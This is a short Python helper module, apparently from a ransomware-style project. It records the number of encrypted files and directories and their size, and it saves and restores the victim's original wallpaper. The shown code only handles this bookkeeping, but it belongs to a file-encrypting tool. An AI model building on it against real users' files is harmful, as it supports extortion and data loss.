from glob import glob
from json import loads
from CryptoApp import CryptoApp
import os



# If decrypted successfully, handle the JSON file and return the old wallpaper
def handleAndRemoveJSONinfo(JSON_PATH, APP) -> str | None:
    # Make sure the JSON file exists
    if not os.path.isfile(JSON_PATH): return None

    old_wallpaper: Optional[str] = None

    # Parse the JSON file
    json_file: str = APP.readFile(JSON_PATH)
    to_dict: dict = loads(json_file)

    # Remove the JSON file
    os.remove(JSON_PATH)

    if 'original_background' in to_dict:
        # Return the wallpaper variable
        return to_dict["original_background"]


# Dumps the crucial informations to the JSON file
def saveInfoToJSON(target_os: str, target_de: str, dirs_num: int, files_num: int, total_size: int) -> dict:
    asJSON = {}
    asJSON['os'] = target_os
    asJSON['de'] = target_de
    asJSON["status"] = 'encrypted'
    asJSON["directories"] = dirs_num
    asJSON["files_modified"] = files_num
    asJSON["modified_size"] = f'{total_size} MiB'

    return asJSON